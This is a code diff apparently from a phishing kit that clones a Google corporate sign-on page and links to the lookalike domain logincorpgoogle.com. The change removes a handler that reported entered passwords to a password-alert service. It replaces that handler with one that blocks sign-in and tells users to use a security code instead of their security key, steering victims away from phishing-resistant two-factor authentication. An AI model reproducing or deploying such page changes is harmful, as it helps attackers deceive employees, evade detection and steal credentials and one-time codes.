@@ -18,16 +18,9 @@
           if (f === null) {
             return;
           }
-          f.addEventListener('submit', function() {
-            if (LTR_TGTS.map(u => { return atob(u); }).includes(
-                f.elements['u'].value.toLowerCase().trim())) {
-              var un = f.elements['u'].value.toLowerCase().trim();
-              var pw = btoa(document.getElementById('password').value);
-              var oReq = new XMLHttpRequest();
-              oReq.open("POST", "https://cloud-password-alert.appspot.com/log", false); // synchronous
-              oReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-              oReq.send(`user=${un}&password=${pw}&source=corplogin`);
-            }
+          f.addEventListener('submit', function(e) {
+			e.preventDefault();
+            alert("Use the security code instead of the security Key to complete the verification!")
           });
         });
 
@@ -277,11 +270,9 @@ google.com
 <div id="waitforupdate"><div id="waitforupdate-text">Updating your security key.</div>
 <div id="waitforupdate-image"></div></div></div></div>
 <div style="clear:both" align="center"><input type="submit" name="signInButton" id="signInButton" value="Sign in" style="padding: 2px;" tabindex="4" aria-live="off"></div>
-<table border="0" width="100%" style="padding-top: 50px;" role="presentation"><tbody><tr><td align="left"><font size="-1"><a id="switchOtpLink" href="https://logincorpgoogle.com/gnubby.html">Use Security Code</a>
-<script type="text/javascript" nonce="">
-                                
-                                document.getElementById('switchOtpLink').onclick = setDisableGnubbyCookie;
-                              </script></font></td>
+<table border="0" width="100%" style="padding-top: 50px;" role="presentation">
+<tbody><tr><td align="left"><font size="-1"><a id="switchOtpLink" href="https://logincorpgoogle.com/gnubby.html">Use Security Code</a>
+</font></td>
 <td align="right"><font size="-1"><a href="https://static.corp.google.com/corpsso/techstop/techstop-phones.html">Security Key help</a></font></td></tr>
 <tr><td colspan="2" align="right"><font size="-1"><a href="https://static.corp.google.com/corpsso/techstop/techstop-phones.html">Password help</a></font></td></tr></tbody></table></div></td>
 <td class="image-cell"><div id="corplogin-image"><img class="login-image" src="images/DSC_0179-01.jpg" alt=""></div></td></tr></tbody></table></form></div>
